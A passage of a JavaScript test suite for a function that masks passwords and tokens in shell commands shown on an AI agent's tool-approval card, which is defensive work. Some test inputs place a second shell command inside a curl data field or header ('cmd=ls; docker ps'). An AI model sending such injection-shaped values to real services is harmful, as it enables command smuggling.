  assert.deepEqual(wrong, [], `${wrong.length} of ${FLAG_SPELLINGS.length} lines are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${FLAG_SPELLINGS.length} lines on the spellings of the flag of the user: glued to the user, after a quote, in the JSON text of a call (masked like the flag with a blank, with the same two exemptions)`);
}

// The flag of a container client is the client's only BEFORE the image: `docker run [flags] IMAGE [COMMAND] [ARGS]`, and what follows the image belongs to the program that runs in the container (`docker run img
// tool -u admin:secret https://...`: the -u is the tool's, and a tool is any program). So a user and a group is readable only when the words before the flag are the subcommand (run, exec, create or config,
// after compose, container, service or pod where there is one) and flags with their values; a word that is none of them is the image, the container or the service, and the flag after it is masked.
// Which word is the value of a flag is told by the flag: a long flag takes the word after it unless it is one of the ones that take none (--rm ...); a short flag takes it only if its letter is one of the clients'
// (-e, -v, -p, -w ...), so that a flag that is none of theirs (-k, -s) does not swallow the image. The value can be glued to the flag (-p80:80, --name=web).
{
  const NO_VALUE_FLAGS = ['--rm', '--init', '--privileged', '--read-only', '--detach', '--interactive', '--tty', '--publish-all', '--quiet', '--no-healthcheck', '--no-deps', '--build', '--service-ports', '--remove-orphans', '--help'];
  const VALUE_LETTERS = ['e', 'v', 'p', 'w', 'l', 'h', 'm', 'c', 'a', 'f', 'u', 'n'];
  const LETTERS_WITHOUT_A_VALUE = ['d', 'i', 't', 'P', 'q', 'T', 'k', 's', 'X', 'z'];
  const masked = (line) => line.replace('node:node', 'node:[REDACTED]').replace(`admin:${V}`, 'admin:[REDACTED]');
  const AFTER_THE_IMAGE = [
    `docker run img tool -u admin:${V} https://x.example.test`,
    `docker run img -u admin:${V}`,
    `docker run --rm img tool -u admin:${V}`,
    `docker run --rm img -u admin:${V}`,
    `docker run -it --rm -v /srv:/srv img tool --verbose -u admin:${V}`,
    `docker run ghcr.io/org/tool:1.0 -u admin:${V}`,
    `docker run -e A=b -e C=d img sh -c 'x' -u admin:${V}`,
    `docker exec web mytool -u admin:${V}`,
    'docker exec web -u node:node',
    'docker exec -it web -u node:node bash',
    'docker compose run app npm test -u node:node',
    'docker compose run --rm app -u node:node',
    'docker-compose run app -u node:node',
    'docker container run img -u node:node',
    'docker container exec web -u node:node sh',
    'docker service create img -u node:node',
    'podman run img -u node:node',
    'nerdctl run img -u node:node',
    'buildah run ctr -- tool -u node:node',
    'sudo docker run img tool -u node:node',
    'env A=1 docker run img -u node:node',
    'FOO=bar docker run img -u node:node',
    'docker.exe run img -u node:node',
    '/usr/bin/docker exec web ls -u node:node',
    'docker run -p8080:80 img -u node:node',
    'docker run -v/srv:/srv img -u node:node',
    'docker run --name=web img -u node:node',
    'docker run -w /app img -u node:node',
    'docker run -e "A=b c" img -u node:node',
    "docker run --entrypoint '' img -u node:node",
    'docker run --rm\\\n  img\\\n  -u node:node',
    "docker run -e 'A=b\\' img -u node:node",
    'docker run -e A=${B:-x y} img -u node:node',
    'docker run -e A=$(echo a b) img -u node:node',
    'docker run "img"-u node:node x',
    'docker run -e A=b\\ c img -u node:node',
    'docker run -v $(pwd):/app img -u node:node',
    'docker run \\\n  --rm \\\n  img \\\n  -u node:node',
    'docker run `\n  --rm `\n  img `\n  -u node:node',
    'docker run -a stdin -a stdout img -u node:node',
    ...NO_VALUE_FLAGS.map((flag) => `docker run ${flag} img -u node:node`),
    ...LETTERS_WITHOUT_A_VALUE.map((letter) => `docker run -${letter} img -u node:node`),
    ...VALUE_LETTERS.map((letter) => `docker run -${letter}value img -u node:node`),
    ...VALUE_LETTERS.map((letter) => `docker run -${letter} value img -u node:node`),
    'docker run -k img --user node:node', 'docker run -s img --user=node:node', 'docker run -X POST img -u node:node',
    'docker run -dit img -u node:node',
    'docker run -itd img -u node:node',
  ];
  const BEFORE_THE_IMAGE = [
    'docker run -u node:node img',
    'docker run --user node:node img',
    'docker run --user=node:node img',
    'docker exec -u root:root web bash',
    'docker exec -it -u root:root web bash -c "echo hi; ls"',
    "docker exec -u root:root web sh -c 'a; b'",
    'docker create -u node:node img',
    'docker run --rm -it -v $(pwd):/app -w /app -u node:node node:20 npm test',
    'docker run -e "FOO=bar baz" --user app:app img',
    "docker run -e 'A=b' -e \"C=d\" -u node:node img",
    'docker run --env-file .env -p 8080:80 -u node:node nginx',
    'docker run -d --name web -p 80:80 -u app:app nginx',
    'docker run -dit --name x -u app:app img',
    'docker run -itd -u app:app img',
    'docker run --restart always --cpus 2 --memory 1g -u app:app img',
    'docker run -v /srv:/srv:ro --network=host -u app:app img',
    'docker run -p8080:80 -v/srv:/srv -u node:node img',
    'docker run -a stdin -a stdout -u node:node img',
    'docker run -h myhost -l k=v -m 1g -c 512 -u node:node img',
    'docker run --pull always --platform linux/amd64 -u node:node img',
    "docker run --entrypoint '' -u node:node img",
    'docker run --entrypoint "" -u node:node img',
    'docker run -e A=1 -e B=2 --label x=y --label "p q" -u node:node img',
    'docker --context prod run -u node:node img',
    'docker --config /tmp/c run -u node:node img',
    'docker compose run --rm -u node:node app npm test',
    'docker compose exec -u node:node app sh',
    'docker-compose run --rm -u node:node app',
    'docker container run --rm -u node:node img',
    'docker container exec -u root:root web sh',
    'docker service create --user app:app img',
    'podman run --userns=keep-id -u node:node img',
    'podman container run -u node:node img',
    'nerdctl run --rm -u node:node img',
    'buildah run --user node:node ctr -- sh',
    'buildah config --user node:node ctr',
    'sudo docker exec -u root:root web sh',
    'sudo -E docker run --rm -u node:node img',
    'env A=1 docker run -u node:node img',
    'time docker run -u node:node img',
    'FOO=bar docker run -u node:node img',
    '/usr/bin/docker run -u node:node img',
    'docker.exe run -u node:node img',
    'docker run \\\n  -v "$(pwd):/app" \\\n  -u node:node \\\n  img',
    'docker run `\n  -v "${PWD}:/app" `\n  -e "A=b" `\n  -u node:node img',
    'cd /tmp && docker run -u node:node img',
    'curl https://x.example.test -o f; docker run --rm -u node:node img',
    'docker run -e "NAME=O\'Brien" -u node:node img',
    'docker run -e A=$(echo hello world) -u node:node img',
    'docker run -e A=${B:-x y} -u node:node img',
    'docker run -e A=b\\ c -u node:node img',
    'docker run --some-flag -e A=b -u node:node img',
    ...NO_VALUE_FLAGS.map((flag) => `docker run ${flag} -u node:node img`),
    ...LETTERS_WITHOUT_A_VALUE.map((letter) => `docker run -${letter} -u node:node img`),
    ...VALUE_LETTERS.map((letter) => `docker run -${letter} value -u node:node img`),
    ...VALUE_LETTERS.map((letter) => `docker run -${letter}value -u node:node img`),
    'docker compose -f docker-compose.yml run -u node:node app',
    // the numeric pair is judged by its shape alone, wherever it stands
    'docker run img tool -u 1000:1000',
    'docker exec web mytool -u 1000:1000',
  ];
  // a subcommand that is not one with a user and a group: the flag is the registry's user (login) or nobody's
  const OTHER_SUBCOMMANDS = [
    ['docker login -u admin:SECRET registry.example.test', 'docker login -u admin:[REDACTED] registry.example.test'],
    ['docker pull -u node:node img', 'docker pull -u node:[REDACTED] img'],
    ['docker build -u node:node .', 'docker build -u node:[REDACTED] .'],
    ['docker -u node:node run img', 'docker -u node:[REDACTED] run img'],
    ['docker -H unix:///var/run/docker.sock run -u node:node img', 'docker -H unix:///var/run/docker.sock run -u node:[REDACTED] img'],
    ['docker compose up -u node:node', 'docker compose up -u node:[REDACTED]'],
    ['docker container ls -u node:node', 'docker container ls -u node:[REDACTED]'],
    ['docker compose -u node:node', 'docker compose -u node:[REDACTED]'],
    ['docker node run -u node:node img', 'docker node run -u node:[REDACTED] img'],
    ['docker run run -u node:node img', 'docker run run -u node:[REDACTED] img'],
  ];
  const wrong = [];
  for (const line of AFTER_THE_IMAGE) if (maskSecrets(line, []) !== masked(line)) wrong.push(`after the image: ${JSON.stringify(line)} -> ${JSON.stringify(maskSecrets(line, []))}`);
  for (const line of BEFORE_THE_IMAGE) if (maskSecrets(line, []) !== line) wrong.push(`before the image: ${JSON.stringify(line)} -> ${JSON.stringify(maskSecrets(line, []))}`);
  for (const [line, expected] of OTHER_SUBCOMMANDS) if (maskSecrets(line.replace('SECRET', V), []) !== expected.replace('SECRET', V).replace(`admin:${V}`, 'admin:[REDACTED]')) wrong.push(`other subcommand: ${JSON.stringify(line)} -> ${JSON.stringify(maskSecrets(line.replace('SECRET', V), []))}`);
  assert.deepEqual(wrong, [], `${wrong.length} of ${AFTER_THE_IMAGE.length + BEFORE_THE_IMAGE.length + OTHER_SUBCOMMANDS.length} commands are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${AFTER_THE_IMAGE.length} container commands with the flag after the image are masked, ${BEFORE_THE_IMAGE.length} with the flag before it stay, ${OTHER_SUBCOMMANDS.length} subcommands that have no user and group are masked (${NO_VALUE_FLAGS.length} long flags that take no value, ${VALUE_LETTERS.length} letters that take one)`);
}

// A shell command in a string of another language, in a FILE that the card shows (a package.json script, a YAML `run: "..."`, a Python string, a doubled-quote string of YAML or PowerShell): the card draws the
// lines of a file as they are, so nothing is decoded, and the rules read a `\"` where the command has a quote, a `''` where it has one, and a `\n` in front of curl. Three fail-safes (round 5 of the audit of
// PR #103 prototyped them; a text that is JSON is masked as a structure instead, see previewArguments below): curl after a backslash and n, r or t is curl; a `\"` that can close something outside quotes fails the
// proof that a container command starts outside every quote; so does a doubled quote glued to the word before it. A fail-safe masks more, never less: the price is a container command that is
// written that way (`docker run -e A=b'' -u node:node img`).
{
  const FILE_TEXT = [
    // curl after the escape of a line break or a tab: a numeric pair is a password, not a user id and a group id
    ['curl after \\n in the text of a string', '{"command":"cd /app\\ncurl -u 5551234567:7391824 https://x.example.test"}', '{"command":"cd /app\\ncurl -u 5551234567:[REDACTED] https://x.example.test"}'],
    ['curl after \\r', 'run = "cd /app\\r\\ncurl -u 5551234567:7391824 https://x.example.test"', 'run = "cd /app\\r\\ncurl -u 5551234567:[REDACTED] https://x.example.test"'],
    ['curl after \\t', '{"command":"run:\\tcurl -u 5551234567:7391824 https://x.example.test"}', '{"command":"run:\\tcurl -u 5551234567:[REDACTED] https://x.example.test"}'],
    ['curl right after \\r', 'run = "cd /app\\rcurl -u 5551234567:7391824 https://x.example.test"', 'run = "cd /app\\rcurl -u 5551234567:[REDACTED] https://x.example.test"'],
    ['curl right after \\n', 'run = "cd /app\\ncurl -u 5551234567:7391824 https://x.example.test"', 'run = "cd /app\\ncurl -u 5551234567:[REDACTED] https://x.example.test"'],
    ['curl.exe after \\n, the flag first', '{"command":"cd C:\\\\work\\ncurl.exe -u 5551234567:7391824 https://x.example.test"}', '{"command":"cd C:\\\\work\\ncurl.exe -u 5551234567:[REDACTED] https://x.example.test"}'],
    ['curl CAPITALS after \\n', '{"command":"cd /app\\nCURL -u 5551234567:7391824 https://x.example.test"}', '{"command":"cd /app\\nCURL -u 5551234567:[REDACTED] https://x.example.test"}'],
    ['n, r and t without their backslash are letters of another word', 'docker exec -e ncurl -u node:node web; docker exec -e rcurl -u node:node web; docker exec -e tcurl -u node:node web', 'docker exec -e ncurl -u node:node web; docker exec -e rcurl -u node:node web; docker exec -e tcurl -u node:node web'],
    ['a backslash and another letter is another word', 'docker exec -e \\fcurl -u node:node web; docker exec -e \\bcurl -u node:node web', 'docker exec -e \\fcurl -u node:node web; docker exec -e \\bcurl -u node:node web'],
    ['curl glued after the escape: \\ncurly is another word', 'docker exec -e \\ncurly -u node:node web', 'docker exec -e \\ncurly -u node:node web'],
    // a backslash and a double quote, outside quotes, that can close a string
    ['\\" and then a ; in the text of a string', `curl -d \\"cmd=ls; docker ps\\" -u admin:${V} https://ci.example.test/api`, 'curl -d \\"cmd=ls; docker ps\\" -u admin:[REDACTED] https://ci.example.test/api'],
    ['the same in a line of a package.json', `"deploy": "curl -d \\"cmd=ls; docker ps\\" -u admin:${V} https://ci.example.test/api",`, '"deploy": "curl -d \\"cmd=ls; docker ps\\" -u admin:[REDACTED] https://ci.example.test/api",'],
    ['a YAML double-quoted run', `  - run: "curl --data \\"cmd=ls && docker run img\\" -u admin:${V} https://ci.example.test/api"`, '  - run: "curl --data \\"cmd=ls && docker run img\\" -u admin:[REDACTED] https://ci.example.test/api"'],
    ['a Python string', `os.system("curl -H \\"X-Run: a | sudo docker run img\\" --user admin:${V} https://ci.example.test/api")`, 'os.system("curl -H \\"X-Run: a | sudo docker run img\\" --user admin:[REDACTED] https://ci.example.test/api")'],
    ['an escaped quote that opens a word stays an escaped character', 'docker run -e A=\\"b -u node:node img', 'docker run -e A=\\"b -u node:node img'],
    ['and inside single quotes a backslash is a character, so \\" and a blank close nothing', `docker run -e 'A=\\" b' -u node:node img`, `docker run -e 'A=\\" b' -u node:node img`],
    ['inside double quotes it is an escaped quote', `docker run -e "A=\\" b" -u node:node img`, `docker run -e "A=\\" b" -u node:node img`],
    ['an escaped quote around a word that is not closed by a blank, a separator or a bracket', 'docker run -e A=\\"b\\"x -u node:node img', 'docker run -e A=\\"b\\"x -u node:node img'],
    ['\\" followed by a blank', 'docker run -e A=b\\" -u node:node img', 'docker run -e A=b\\" -u node:[REDACTED] img'],
    ['\\" followed by a tab', 'docker run -e A=b\\"\t-u node:node img', 'docker run -e A=b\\"\t-u node:[REDACTED] img'],
    ['\\" at the end of the command, right before the flag', 'docker run -e A=b\\"-u node:node img', 'docker run -e A=b\\"-u node:[REDACTED] img'],
    ['\\" followed by a comma', 'docker run -e A=b\\",x -u node:node img', 'docker run -e A=b\\",x -u node:[REDACTED] img'],
    ['\\" followed by a colon', 'docker run -e A=b\\":x -u node:node img', 'docker run -e A=b\\":x -u node:[REDACTED] img'],
    ['\\" followed by a square bracket', 'docker run -e A=[b\\"] -u node:node img', 'docker run -e A=[b\\"] -u node:[REDACTED] img'],
    ['\\" followed by the parenthesis that closes a substitution', 'docker run -e X=$(echo a\\") -u node:node img', 'docker run -e X=$(echo a\\") -u node:[REDACTED] img'],
    ['\\" followed by the brace that closes a template', 'docker run --format {{.A\\"}} -u node:node img', 'docker run --format {{.A\\"}} -u node:[REDACTED] img'],
    // a doubled quote glued to the word before it (YAML, PowerShell and SQL write a quote inside a string of the same kind twice)
    ['a YAML single-quoted run', `steps:\n  - run: 'curl -d ''cmd=ls; docker ps'' -u admin:${V} https://ci.example.test/api'\n`, `steps:\n  - run: 'curl -d ''cmd=ls; docker ps'' -u admin:[REDACTED] https://ci.example.test/api'\n`],
    ['a PowerShell single-quoted string', `$cmd = 'curl.exe -d ''cmd=ls; docker ps'' -u admin:${V} https://ci.example.test/api'\n`, `$cmd = 'curl.exe -d ''cmd=ls; docker ps'' -u admin:[REDACTED] https://ci.example.test/api'\n`],
    ['a SQL string', `INSERT INTO jobs(cmd) VALUES ('curl -d ''cmd=ls; docker ps'' -u admin:${V} https://ci.example.test/api');\n`, `INSERT INTO jobs(cmd) VALUES ('curl -d ''cmd=ls; docker ps'' -u admin:[REDACTED] https://ci.example.test/api');\n`],
    ['a doubled quote of a header', `curl -H ''X-Run: a | docker run img'' --user admin:${V} https://ci.example.test/api`, `curl -H ''X-Run: a | docker run img'' --user admin:[REDACTED] https://ci.example.test/api`],
    ['doubled double quotes', `curl -d ""cmd=ls; docker ps"" -u admin:${V} https://ci.example.test/api`, 'curl -d ""cmd=ls; docker ps"" -u admin:[REDACTED] https://ci.example.test/api'],
    ['a doubled single quote after the value of a flag', `curl -d ''cmd=ls; docker run -e a'' -u admin:${V} https://ci.example.test/api`, `curl -d ''cmd=ls; docker run -e a'' -u admin:[REDACTED] https://ci.example.test/api`],
    ['a doubled double quote after the value of a flag', `curl -d ""cmd=ls; docker run -e a"" -u admin:${V} https://ci.example.test/api`, 'curl -d ""cmd=ls; docker run -e a"" -u admin:[REDACTED] https://ci.example.test/api'],
    ['a YAML single-quoted run whose docker command is a run', `steps:\n  - run: 'curl -d ''cmd=ls; docker run -e a'' -u admin:${V} https://ci.example.test/api'\n`, `steps:\n  - run: 'curl -d ''cmd=ls; docker run -e a'' -u admin:[REDACTED] https://ci.example.test/api'\n`],
    ['adjacent quoted strings are one word, not a doubled quote', "docker run -e 'A=b''c' -u node:node img", "docker run -e 'A=b''c' -u node:node img"],
    ['an empty string after a blank is an empty argument', "docker run --entrypoint '' -u node:node img", "docker run --entrypoint '' -u node:node img"],
    ['and an empty string of double quotes', 'docker run --entrypoint "" -u node:node img', 'docker run --entrypoint "" -u node:node img'],
    ['an empty value glued to its name is the price', "docker run -e A='' -u node:node img", "docker run -e A='' -u node:[REDACTED] img"],
    ['and a doubled quote glued to a word', "docker run -e A=b'' -u node:node img", "docker run -e A=b'' -u node:[REDACTED] img"],
    ['two different quotes in a row are not a doubled quote', `docker run -e "A=b"'c' -u node:node img`, `docker run -e "A=b"'c' -u node:node img`],
    ['a quote that closes a word and one that opens the next one, the same kind with a letter between', `docker run -e 'A=b'c'd' -u node:node img`, `docker run -e 'A=b'c'd' -u node:node img`],
  ];
  const wrong = FILE_TEXT.map(([label, line, expected]) => [label, line, expected, maskSecrets(line, [])]).filter(([, , expected, got]) => got !== expected)
    .map(([label, line, expected, got]) => `${label}: ${JSON.stringify(line)} -> ${JSON.stringify(got)}, expected ${JSON.stringify(expected)}`);
  assert.deepEqual(wrong, [], `${wrong.length} of ${FILE_TEXT.length} lines are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${FILE_TEXT.length} lines of a shell command inside a string of another language in a file: curl after \\n \\r \\t, a \\" that can close a string, a doubled quote glued to a word (fail-safes: masked, not shown)`);
}

// A credential in double quotes inside a string that escapes its quotes, in the text of a FILE: a package.json script, a JSON fixture, a YAML `run: "..."`, a Python string. The quote is written \" there, and the
// quoted-value rules saw no quote (a backslash stood in the way), so --user "admin:S", --password "S", mysql -p"S" and export API_KEY="S" were masked by no rule. A quote that is written \" opens and closes a
// value like one that is not. (The strings of the arguments of a tool call are masked decoded, see previewArguments; a file is drawn as it is.)
{
  const ESCAPED = [
    ['--user', `curl --user "admin:${V}" https://x.example.test`, `curl --user "admin:[REDACTED]" https://x.example.test`],
    ['-u', `curl -u "admin:${V}" https://x.example.test`, `curl -u "admin:[REDACTED]" https://x.example.test`],
    ['--proxy-user', `curl --proxy-user "proxy:${V}" https://x.example.test`, `curl --proxy-user "proxy:[REDACTED]" https://x.example.test`],
    ['-u glued', `curl -u"admin:${V}" https://x.example.test`, `curl -u"admin:[REDACTED]" https://x.example.test`],
    ['--password', `tool --password "${V}" run`, `tool --password "[REDACTED]" run`],
    ['--token=', `tool --token="${V}" run`, `tool --token="[REDACTED]" run`],
    ['mysql -p', `mysql -u root -p"${V}" db`, `mysql -u root -p"[REDACTED]" db`],
    ['sshpass -p', `sshpass -p "${V}" ssh host`, `sshpass -p "[REDACTED]" ssh host`],
    ['docker login -p', `docker login -u me -p "${V}" registry.example.test`, `docker login -u me -p "[REDACTED]" registry.example.test`],
    ['export API_KEY=', `export API_KEY="${V}"`, `export API_KEY="[REDACTED]"`],
    ['password =', `password = "${V}"`, `password = "[REDACTED]"`],
    ['password:', `password: "${V}"`, `password: "[REDACTED]"`],
    ['a value with a blank in it', `tool --password "two words ${V}" run`, `tool --password "[REDACTED]" run`],
    // what is not a secret stays, escaped quotes or not
    ['a read of a variable', 'tool --password "$PASS" run', 'tool --password "$PASS" run'],
    ['an empty value', 'tool --password "" run', 'tool --password "" run'],
    ['the credentials option of fetch', 'fetch(url, { credentials: "include" })', 'fetch(url, { credentials: "include" })'],
    ['a user and a password read from the environment', 'curl -u "$USER:$PASS" https://x.example.test', 'curl -u "$USER:$PASS" https://x.example.test'],
    ['a numeric pair with no curl before it, in quotes', 'tool -u "1000:1000" run', 'tool -u "1000:1000" run'],
  ];
  // a shell script that escapes its apostrophes: \'S\'
  for (const [line, expected] of [
    [`tool --password \\'${V}\\' run`, "tool --password \\'[REDACTED]\\' run"],
    [`mysql -u root -p\\'${V}\\' db`, "mysql -u root -p\\'[REDACTED]\\' db"],
    [`curl -u \\'admin:${V}\\' https://x.example.test`, "curl -u \\'admin:[REDACTED]\\' https://x.example.test"],
    [`export API_KEY=\\'${V}\\'`, "export API_KEY=\\'[REDACTED]\\'"],
  ]) assert.equal(maskSecrets(line, []), expected, `${line}: an escaped apostrophe is a quote too`);
  const wrong = [];
  for (const [label, line, expected] of ESCAPED) {
    const asJson = JSON.stringify({ command: line });
    const gotJson = maskSecrets(asJson, []);
    if (gotJson !== JSON.stringify({ command: expected })) wrong.push(`${label}, as the JSON text of a call: ${asJson} -> ${gotJson}`);
    const asScript = `"deploy": ${JSON.stringify(line)},`;
    const gotScript = maskSecrets(asScript, []);
    if (gotScript !== `"deploy": ${JSON.stringify(expected)},`) wrong.push(`${label}, as a line of a package.json: ${asScript} -> ${gotScript}`);
    if (maskSecrets(line, []) !== expected) wrong.push(`${label}, as it is written: ${line} -> ${maskSecrets(line, [])}`);
  }
  assert.deepEqual(wrong, [], `${wrong.length} are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${ESCAPED.length} credentials written in double quotes (and what is no secret) are masked the same when the quote is written \\" in a JSON string or in the line of a package.json`);
}

// The password of a flag of the user runs up to the next blank, quote or separator. In the text of a FILE that holds the ESCAPES of another language (a Python string, a YAML `run: "..."`, the text of a JSON
// string) a line break is `\n`: TWO characters and no blank. The password of `-u 1000:1000` then ran ACROSS the escape and took the NAME of the next secret with it (`napi_key=`: the n of the escape is a letter of
// the name, and a name may have a prefix), and the value behind the name stayed in view. Main has this for an ordinary flag (`curl -u admin:pw\napi_key='S'`); the widening of this PR (a flag right after a quote,
// the user glued to -u) made five more shapes reach it (round 1 of the audit of PR #108). The two rules of "a secret assigned to a name" now run BEFORE the rules of the flag of the user: a name is found whatever
// stands in front of it, and the flag takes what is left. The preview is garbled in these shapes (`-u 1000:[REDACTED]'[REDACTED]'`): the rules cannot tell where the escape ends, and they hide both.
// Each shape is run alone, with a readable container command in front of it and with one behind it: the fix must not hide the container command's own user and group.
{
  const ESCAPE_SHAPES = [
    // [what it is, the text, the text as it is masked, a container command whose flag is readable]
    ['an ordinary flag and a name in quotes (a Python string; main has this one too)', `os.system("curl -u admin:pw\\napi_key='${V}'")`, `os.system("curl -u admin:[REDACTED]'[REDACTED]'")`, 'docker run -u node:node img'],
    ['an ordinary flag and a bare name (main has this one too)', `os.system("curl -u admin:pw\\npassword: ${V}")`, 'os.system("curl -u admin:[REDACTED] [REDACTED]")', 'docker run -u node:node img'],
    ['a numeric pair right after the opening quote', `os.system("-u 1000:1000\\napi_key='${V}'")`, `os.system("-u 1000:[REDACTED]'[REDACTED]'")`, 'docker run -u 1000:1000 alpine id'],
    ['a user and a group right after the opening quote', `cmd = "--user node:node\\napi_key='${V}'"`, `cmd = "--user node:[REDACTED]'[REDACTED]'"`, 'docker run --user node:node img'],
    ['date -u, three lines, a pair and a name, in the text of a JSON string', `{"command":"date -u\\nls\\nx:y\\n-d\\napi_key='${V}' "}`, `{"command":"date -u\\nls\\nx:[REDACTED]'[REDACTED]' "}`, 'docker exec -u app:app web id'],
    ['the user glued to -u, then a name in quotes', `x = "tool -uroot:pw\\napi_key='${V}'"`, `x = "tool -uroot:[REDACTED]'[REDACTED]'"`, 'docker run -unode:node img'],
    ['the user glued to -u, then a bare name (a YAML run)', `steps:\n  - run: "-username:abc\\npassword: ${V}"\n`, 'steps:\n  - run: "-username:[REDACTED] [REDACTED]"\n', 'docker run -unode:node img'],
    ['a PowerShell variable behind the escape', `x = "tool -uroot:pw\\n$password = '${V}'"`, `x = "tool -uroot:[REDACTED] = '[REDACTED]'"`, 'docker run -unode:node img'],
    ['an exported name behind the escape (the word export goes with the password, the name stays)', `x = "-u 1000:1000\\nexport API_TOKEN='${V}'"`, `x = "-u 1000:[REDACTED] API_TOKEN='[REDACTED]'"`, 'docker run -u 1000:1000 alpine id'],
  ];
  const wrong = [];
  const run = (label, line, expected) => { const got = maskSecrets(line, []); if (got !== expected) wrong.push(`${label}: ${JSON.stringify(line)} -> ${JSON.stringify(got)}, expected ${JSON.stringify(expected)}`); };
  for (const [label, text, expected, container] of ESCAPE_SHAPES) {
    run(label, text, expected);
    run(`${label}, a readable container command in front of it`, `${container}\n${text}`, `${container}\n${expected}`);
    run(`${label}, a readable container command behind it`, `${text}\ndocker run -u node:node img`, `${expected}\ndocker run -u node:node img`);
    assert.ok(!expected.includes(V), `${label}: the expected text must not hold the secret`);
  }
  // the same flags with a REAL line break or a real blank before the name: the escape is not there, the flag stops at the blank, and a numeric pair of a text with no curl stays readable
  run('a real line break instead of the escape', `os.system("-u 1000:1000\napi_key='${V}'")`, `os.system("-u 1000:1000\napi_key='[REDACTED]'")`);
  run('a real blank instead of the escape', `os.system("-u 1000:1000 api_key='${V}'")`, `os.system("-u 1000:1000 api_key='[REDACTED]'")`);
  run('a real line break after an ordinary flag', `os.system("curl -u admin:pw\napi_key='${V}'")`, `os.system("curl -u admin:[REDACTED]\napi_key='[REDACTED]'")`);
  // a name and a readable container flag in ONE command: the name goes first now, and the container rule reads the text with its [REDACTED]
  run('a name before the readable flag of a container command', `docker run -e API_KEY=${V} -u node:node img`, 'docker run -e API_KEY=[REDACTED] -u node:node img');
  run('a quoted name before the readable flag of a container command', `docker run -e API_KEY='${V}' -u 1000:1000 alpine id`, "docker run -e API_KEY='[REDACTED]' -u 1000:1000 alpine id");
  run('a name after the readable flag of a container command', `docker run -u node:node -e PASSWORD="${V}" img`, 'docker run -u node:node -e PASSWORD="[REDACTED]" img');
  run('the flag and the name of a curl in the same command', `curl -u admin:pw -d 'password=${V}' https://x.example.test`, "curl -u admin:[REDACTED] -d 'password=[REDACTED]' https://x.example.test");
  assert.deepEqual(wrong, [], `${wrong.length} lines are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${ESCAPE_SHAPES.length} shapes of a flag of the user followed by the escape \\n and the name of a secret, each alone and next to a readable container command: the value is hidden, the container flag stays`);
}

// A bare value that starts with a backslash is a value. Only the backslash of a quote (\" or \') is the start of a quoted value, and the bare value does not start with it. A Windows share, a path with a
// backslash or a password that holds one is a bare value. Round 1 of the audit of PR #108: the exclusion of `bareValue` was widened to ANY backslash by a mutant and no row noticed; the four rules that read a bare
// value are the long flags, the -p of mysql, the -p of sshpass and the -p of the login of a container client.
{
  const BARE_BACKSLASH = [
    ['a long flag, a value that starts with a backslash', `deploy --password \\${V} --env prod`, 'deploy --password [REDACTED] --env prod'],
    ['a long flag, a share of Windows', `deploy --token \\\\server\\share\\${V} now`, 'deploy --token [REDACTED] now'],
    ['a long flag, a path of Windows', `deploy --api-key C:\\keys\\${V} now`, 'deploy --api-key [REDACTED] now'],
    ['the -p of mysql, glued', `mysql -p\\${V} db`, 'mysql -p[REDACTED] db'],
    ['the -p of mysql, after a user', `mysql -u root -p\\\\${V} db`, 'mysql -u root -p[REDACTED] db'],
    ['the -p of sshpass', `sshpass -p \\${V} ssh host`, 'sshpass -p [REDACTED] ssh host'],
    ['the -p of the login of a container client', `docker login -u me -p \\${V} registry.example.test`, 'docker login -u me -p [REDACTED] registry.example.test'],
    // the other side of the exclusion: the backslash of a quote starts a QUOTED value, whose quotes stay
    ['a long flag, a value in \\"..\\"', `deploy --password \\"${V}\\" --env prod`, 'deploy --password \\"[REDACTED]\\" --env prod'],
    ['a long flag, a value in \\\'..\\\'', `deploy --password \\'${V}\\' --env prod`, "deploy --password \\'[REDACTED]\\' --env prod"],
  ];
  const wrong = BARE_BACKSLASH.map(([label, line, expected]) => [label, line, expected, maskSecrets(line, [])]).filter(([, , expected, got]) => got !== expected)
    .map(([label, line, expected, got]) => `${label}: ${JSON.stringify(line)} -> ${JSON.stringify(got)}, expected ${JSON.stringify(expected)}`);
  assert.deepEqual(wrong, [], `${wrong.length} of ${BARE_BACKSLASH.length} lines are not as expected:\n  ${wrong.join('\n  ')}`);
  ok(`${BARE_BACKSLASH.length} lines on a bare value that starts with a backslash (a share, a path, a password) in the four rules that read one: masked; the backslash of a quote starts a quoted value`);
}

// The arguments of a tool call are printed as JSON on the approval card (previewArguments, which PermissionGate uses for a tool that is not local and for the `arguments` of a local tool that has no
// card of its own). Their strings are masked as the text they are BEFORE they are written as JSON, then the JSON is masked once more (the names of the keys and the other fields are in view there).
// (The permission suite runs the same shapes through the gate: tests/verify-permissions-modes.mjs.)
{
  const LAYOUTS = [
    ['an object', (command) => ({ command })],
    ['two levels down', (command) => ({ job: { steps: [{ run: command }] } })],
    ['a list', (command) => ({ commands: ['echo start', command] })],
    ['a string', (command) => command],
  ];
  // 1. every shape of a command inside the JSON text, in every layout: the password is gone and the first word of the command is still there
  const leaks = [];
  let cases = 0;
  for (const [label, command, secret] of JSON_TEXT_SHAPES) {
    for (const [layout, wrap] of LAYOUTS) {
      const out = previewArguments(wrap(command));
      cases += 1;
      if (out.includes(secret)) leaks.push(`${layout} / ${label}`);
      assert.ok(out.includes(command.split(/[\s=]/)[0].replace(/^"/, '')), `${layout} / ${label}: the command is not blanked as a whole`);
    }
  }
  assert.deepEqual(leaks, [], `${leaks.length} of ${cases} show the password:\n  ${leaks.join('\n  ')}`);

  // 2. a command that is written as masked text and then as JSON is what the card prints, whatever the layout
  for (const [command, masked] of [
    ['curl --user "admin:Zq424242aB" https://x.test', 'curl --user "admin:[REDACTED]" https://x.test'],
    ['mysql -u root -p"Zq424242aB" db', 'mysql -u root -p"[REDACTED]" db'],
    ['sshpass -p "Zq424242aB" ssh host', 'sshpass -p "[REDACTED]" ssh host'],
    ['export API_KEY="Zq424242aB"', 'export API_KEY="[REDACTED]"'],
  ]) {
    for (const [layout, wrap] of LAYOUTS) {
      assert.equal(previewArguments(wrap(command)), JSON.stringify(wrap(masked)), `${layout}: the structure is kept and only the secret is replaced (${command})`);
    }
  }

  // 3. arguments that hold no secret come back exactly as JSON.stringify writes them
  const BENIGN_ARGUMENTS = [
    { command: 'ls -la', cwd: 'src' },
    { path: 'src/app.js', pattern: 'TODO', ignoreCase: true, limit: 20 },
    { url: 'https://example.com/a?b=c&d=e' },
